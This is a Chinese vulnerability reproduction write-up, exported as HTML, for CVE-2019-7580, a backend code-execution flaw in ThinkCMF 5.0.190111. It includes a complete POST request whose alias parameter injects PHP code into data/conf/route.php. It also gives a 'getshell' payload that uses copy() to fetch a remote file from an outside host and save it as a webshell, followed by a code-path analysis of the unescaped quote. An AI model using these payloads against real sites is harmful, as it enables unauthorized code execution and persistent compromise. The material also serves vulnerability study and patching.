<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X44935fb63ae41364a15dd1e8839bf12d3bc559e"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-7580</span><span class="csECDA2D3">）</span><span class="csDE05BCC">ThinkCMF 5.0.190111 </span><span class="csECDA2D3">后台代码执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">ThinkCMF 5.0.190111</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="Xbebde5159e45090f95d7a997c6b96553c2d768e"><span class="csD1E291E2">0x01 </span><span class="csD6CA00D2">利用过程：</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">后台登录状态下，</span><span class="cs8926E06"> 1</span><span class="cs9C1B1871">、将</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">插入数据库并读取然后写入</span><span class="cs8926E06">data/conf/route.php</span><span class="cs9C1B1871">文件</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /portal/admin_category/addpost.html HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 183</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: PHPSESSID=of2ar92rpeucrh4cg6s4t4dae6; admin_username=admin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">parent_id=0&amp;name=111&amp;alias=1&#39;%3D%3Earray(%22%22)%2Cphpinfo()%2C&#39;2</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2</span><span class="cs9C1B1871">、然后访问：</span></p><p class="cs3A447A38"><span class="cs9FB05234">/portal/admin_category/index.html</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">触发</span></p><p class="cs3A447A38"><span class="cs9FB05234">include data/conf/route.php</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">操作，执行</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">。下图以执行</span><span class="cs8926E06">sleep(5)</span><span class="cs9C1B1871">作为演示。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/%ef%bc%88CVE-2019-7580%ef%bc%89ThinkCMF%205.0.190111%20%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="283" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/%ef%bc%88CVE-2019-7580%ef%bc%89ThinkCMF%205.0.190111%20%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.gif" width="560" height="376" alt="" style="border-width:0px;" /></span></p><h4 class="cs868C439D">
			<a name="补充"><span class="cs6EDCDAE2">补充</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs8926E06">poc</span><span class="cs9C1B1871">只是</span><span class="cs8926E06">phpinfo,</span><span class="cs9C1B1871">用</span><span class="cs8926E06">eval</span><span class="cs9C1B1871">一句话，或者用</span><span class="cs8926E06">fputs</span><span class="cs9C1B1871">写马</span><span class="cs8926E06"> </span><span class="cs9C1B1871">等都会报错</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">直接</span><span class="cs8926E06">getshell exp</span></p><p class="cs3A447A38"><span class="cs9FB05234">1&#39;=&gt;array(&quot;&quot;,&quot;&quot;),copy(&quot;http://t00ls.com/1.txt&quot;,&quot;1.php&quot;),&#39;2</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这样网站也会崩掉</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但是会再</span><span class="cs8926E06">public</span><span class="cs9C1B1871">下生成</span><span class="cs8926E06">1.php</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">得快速连上，再清空</span><span class="cs8926E06">thinkcmf\data\conf\route.php </span><span class="cs9C1B1871">文件</span><span class="cs8926E06"> </span><span class="cs9C1B1871">网站方可恢复正常</span></p><h3 class="cs868C439D">
			<a name="Xf62445e4643036043d94f4460cdf1cd11672f08"><span class="csD1E291E2">0x02 </span><span class="csD6CA00D2">利用过程与分析</span></a></h3>
		<h4 class="cs868C439D">
			<a name="X05ff37abcceaf096a908fd244b7c85f1038fe7c"><span class="csBF12A472">1</span><span class="cs6EDCDAE2">、将</span><span class="csBF12A472">payload</span><span class="cs6EDCDAE2">插入数据库，写入</span><span class="csBF12A472">data/conf/route.php</span><span class="cs6EDCDAE2">文件</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">程序的入口是</span><span class="cs8926E06">index.php,</span><span class="cs9C1B1871">在</span><span class="cs8926E06">index.php</span><span class="cs9C1B1871">中</span><span class="cs8926E06">\think\App::run()</span><span class="cs9C1B1871">执行应用。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/%ef%bc%88CVE-2019-7580%ef%bc%89ThinkCMF%205.0.190111%20%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="89" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">App.php</span><span class="cs9C1B1871">的</span><span class="cs8926E06">run()</span><span class="cs9C1B1871">函数</span><span class="cs8926E06">139</span><span class="cs9C1B1871">行，执行</span><span class="cs8926E06">sef::exec();</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/%ef%bc%88CVE-2019-7580%ef%bc%89ThinkCMF%205.0.190111%20%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="311" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过解析</span><span class="cs8926E06">url</span><span class="cs9C1B1871">，得到处理此次请求的控制器、类、函数，即</span><span class="cs9FB05234">AdminCategoryController.php</span><span class="cs9C1B1871">的</span><span class="cs9FB05234">addPost</span><span class="cs9C1B1871">函数。然后调用</span><span class="cs9FB05234">self::invokeMethod()</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/%ef%bc%88CVE-2019-7580%ef%bc%89ThinkCMF%205.0.190111%20%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="180" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过反射执行</span><span class="cs9FB05234">AdminCategoryController.php</span><span class="cs9C1B1871">的</span><span class="cs9FB05234">addPost</span><span class="cs9C1B1871">函数。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">在</span><span class="cs8926E06">addPost</span><span class="cs9C1B1871">函数中，从</span><span class="cs8926E06">$this-&gt;request-&gt;param()</span><span class="cs9C1B1871">函数中得到请求中的参数传递给</span><span class="cs8926E06">$data</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/%ef%bc%88CVE-2019-7580%ef%bc%89ThinkCMF%205.0.190111%20%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="366" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后通过</span><span class="cs8926E06">$this-&gt;validata</span><span class="cs9C1B1871">调用父类</span><span class="cs8926E06">(./simplewind/thinkphp/library/think/Controller.php)</span><span class="cs9C1B1871">的</span><span class="cs8926E06">validata</span><span class="cs9C1B1871">函数进行过滤。然后将</span><span class="cs8926E06">$data</span><span class="cs9C1B1871">传入</span><span class="cs9FB05234">./app/portal/model/PortalCategoryModel.php</span><span class="cs9C1B1871">的</span><span class="cs8926E06">addCategory</span><span class="cs9C1B1871">函数进行实际的</span><span class="cs8926E06">&quot;</span><span class="cs9C1B1871">添加分类</span><span class="cs8926E06">&quot;</span><span class="cs9C1B1871">操作。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/%ef%bc%88CVE-2019-7580%ef%bc%89ThinkCMF%205.0.190111%20%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="308" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">addCategory</span><span class="cs9C1B1871">函数中，</span><span class="cs8926E06">184</span><span class="cs9C1B1871">行这一句：</span></p><p class="cs3A447A38"><span class="cs9FB05234">$findRoute = $this-&gt;where(&#39;full_url&#39;, $fullUrl)-&gt;find();</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过查询数据中是否存在对应的</span><span class="cs8926E06">url</span><span class="cs9C1B1871">，由于是第一次插入，所以这里并没有查到。</span><span class="cs8926E06"> 154</span><span class="cs9C1B1871">行和</span><span class="cs8926E06">155</span><span class="cs9C1B1871">行通过</span><span class="cs9FB05234">setRoute</span><span class="cs9C1B1871">函数对数据库进行了两次插入操作。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">根入</span><span class="cs9FB05234">setRoute</span><span class="cs9C1B1871">函数，</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/%ef%bc%88CVE-2019-7580%ef%bc%89ThinkCMF%205.0.190111%20%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image6.png" width="560" height="181" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其中</span><span class="cs8926E06">$fullUrl</span><span class="cs9C1B1871">和</span><span class="cs8926E06">$url</span><span class="cs9C1B1871">的值如截图所示。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">继续跟，</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/%ef%bc%88CVE-2019-7580%ef%bc%89ThinkCMF%205.0.190111%20%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image7.png" width="560" height="292" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">34</span><span class="cs9C1B1871">行从数据库中查询查询相关数据，</span></p><p class="cs3A447A38"><span class="cs9FB05234">$routes &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= $this-&gt;where(&quot;status&quot;, 1)-&gt;order(&quot;list_order asc&quot;)-&gt;select();</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs9FB05234">addCategory</span><span class="cs9C1B1871">函数的</span><span class="cs8926E06">157</span><span class="cs9C1B1871">行调用</span></p><p class="cs3A447A38"><span class="cs9FB05234">$routeModel-&gt;getRoutes(true);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最终得到</span><span class="cs9FB05234">$allroutes</span><span class="cs9C1B1871">的值</span><span class="cs8926E06">,</span><span class="cs9C1B1871">创建</span><span class="cs9FB05234">data/conf</span><span class="cs9C1B1871">目录，然后拼接待写入的</span><span class="cs9FB05234">route.php</span><span class="cs9C1B1871">文件的完整路径，最后调用</span><span class="cs9FB05234">file_put_contents()</span><span class="cs9C1B1871">完成写入。可见这个漏洞在于没有对</span><span class="cs9FB05234">alias</span><span class="cs9C1B1871">参数中的单引号进行过滤，导致可通过闭合前后的单引号插入用户可控的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">写入前后对比如下：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/%ef%bc%88CVE-2019-7580%ef%bc%89ThinkCMF%205.0.190111%20%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image8.png" width="560" height="760" alt="" style="border-width:0px;" /></span></p><h4 class="cs868C439D">
			<a name="Xf0eee84c09ef650718f77facb838e05a18e2e41"><span class="csBF12A472">2</span><span class="cs6EDCDAE2">、触发</span><span class="csBF12A472">payload</span><span class="cs6EDCDAE2">执行</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">带着登录的</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">访问</span><span class="cs9FB05234">/portal/admin_category/index.html</span><span class="cs9C1B1871">，调用</span><span class="cs9FB05234">routeCheck</span><span class="cs9C1B1871">函数进行</span><span class="cs8926E06">url</span><span class="cs9C1B1871">路由检测</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/%ef%bc%88CVE-2019-7580%ef%bc%89ThinkCMF%205.0.190111%20%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image9.png" width="560" height="171" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里先</span></p><p class="cs3A447A38"><span class="cs9FB05234">include app/route.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/%ef%bc%88CVE-2019-7580%ef%bc%89ThinkCMF%205.0.190111%20%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image10.png" width="560" height="221" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后，</span></p><p class="cs3A447A38"><span class="cs9FB05234">include data/conf/route.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/%ef%bc%88CVE-2019-7580%ef%bc%89ThinkCMF%205.0.190111%20%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image11.png" width="560" height="178" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最终执行我们的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">：</span><span class="cs9FB05234">phpinfo()</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/%ef%bc%88CVE-2019-7580%ef%bc%89ThinkCMF%205.0.190111%20%e5%90%8e%e5%8f%b0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image12.png" width="560" height="431" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://xz.aliyun.com/t/3997#toc-6"><span class="cs4B51D5E4">https://xz.aliyun.com/t/3997#toc-6</span></a></span></p><p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://www.t00ls.net/thread-55060-1-1.html"><span class="cs4B51D5E4">https://www.t00ls.net/thread-55060-1-1.html</span></a></span></p></body>
</html>
